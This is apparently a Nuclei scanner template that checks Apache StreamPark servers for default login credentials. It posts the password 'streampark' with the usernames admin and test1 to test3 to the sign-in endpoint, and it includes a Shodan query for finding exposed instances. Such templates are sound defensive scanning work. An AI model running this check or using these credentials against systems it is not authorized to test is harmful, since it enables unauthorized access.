http:
- attack: pitchfork
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "userId\":", "username\":", "token\":", "expire\":")
    type: dsl
  payloads:
    password:
    - streampark
    username:
    - admin
    - test1
    - test2
    - test3
  raw:
  - 'POST /passport/signin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded;charset=UTF-8


    password={{password}}&username={{username}}&loginType=PASSWORD

    '
id: apache-streampark-default-login
info:
  author: icarot
  classification:
    cpe: cpe:2.3:a:apache:streampark:*:*:*:*:*:*:*
  description: 'Apache Streampark server enables default admin credentials. An attacker
    can execute unauthorized operations.

    '
  metadata:
    max-request: 4
    product: streampark
    shodan-query: title:"Apache StreamPark"
    vendor: apache
  name: Apache Streampark - Default Login
  reference:
  - https://github.com/apache/streampark
  severity: high
  tags: apache,streampark,default-login,vuln
